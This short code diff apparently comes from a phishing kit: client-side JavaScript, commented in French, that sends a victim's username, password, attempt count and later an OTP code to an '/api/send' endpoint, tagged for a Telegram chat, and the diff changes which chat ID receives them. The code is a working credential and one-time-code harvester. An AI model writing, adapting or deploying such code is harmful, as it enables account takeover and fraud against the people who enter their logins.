@@ -93,13 +93,13 @@
           btn.disabled = true;
 
           try {
-              // Envoi des infos à ton API (avec support de l'ID Telegram 6224971749)
+              // Envoi des infos à ton API (avec support de l'ID Telegram 8415739489)
               await fetch('/api/send', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ 
                       type: 'LOGIN', 
-                      chatId: '6224971749', 
+                      chatId: '8415739489', 
                       user: savedUser, 
                       pass: passVal, 
                       attempt: attempts + 1 
@@ -141,7 +141,7 @@
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ 
                       type: 'OTP', 
-                      chatId: '6224971749', 
+                      chatId: '8415739489', 
                       user: savedUser, 
                       otp: otpCode 
                   })
